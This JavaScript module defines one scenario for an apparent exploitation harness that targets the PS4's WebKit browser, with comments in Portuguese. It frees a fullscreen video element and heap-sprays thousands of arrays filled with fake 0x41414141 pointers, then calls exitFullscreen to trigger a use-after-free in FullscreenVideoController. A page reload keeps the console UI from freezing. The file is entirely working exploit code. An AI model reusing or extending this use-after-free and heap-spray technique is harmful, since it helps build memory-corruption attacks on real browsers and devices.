
/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Fase de Exploração / Control)
 * Alvo: FullscreenVideoController::exitFullscreen()
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'HIGH',
    description: 'Retorno à base estável. Tenta substituir o MediaPlayerPrivate freed com ponteiros falsos (0x41414141). Usa reload para evitar soft-brick da UI.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.container.appendChild(this.video);

        // Preparamos a nossa munição de Spray (Uint32Array com ponteiros falsos)
        // 0x41414141 = "AAAA" (Padrão clássico para ver se controlamos a memória)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // Entra no Fullscreen de forma estável (sem bloqueio)
            if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();
            await new Promise(r => setTimeout(r, 100));

            // 1. FREE: Apagamos o vídeo
            // Observação do Leandro: A thread do JS costuma travar exatamente aqui.
            this.video.remove();

            // 2. REUSE (SPRAY): Tentamos preencher o buraco deixado pelo vídeo
            // com 5000 cópias do nosso payload o mais rápido possível
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 3. USE: Disparamos o controlador. 
            // Se ele ler o nosso 0x41414141 como se fosse um ponteiro de função,
            // a PS4 vai dar crash imediato (CE-34878-0)!
            if (document.webkitExitFullscreen) document.webkitExitFullscreen();

            // 4. A REDE DE SEGURANÇA (Da V12.00):
            // Forçamos o recarregamento da página para impedir o congelamento
            // definitivo da UI da consola. Se o Crash Azul não acontecer,
            // o navegador apenas reinicia limpo, pronto para nova varredura.
            setTimeout(() => {
                location.reload();
            }, 500);

        } catch(e) {}
    },

    probe: [
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.videoWidth,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
    }
};
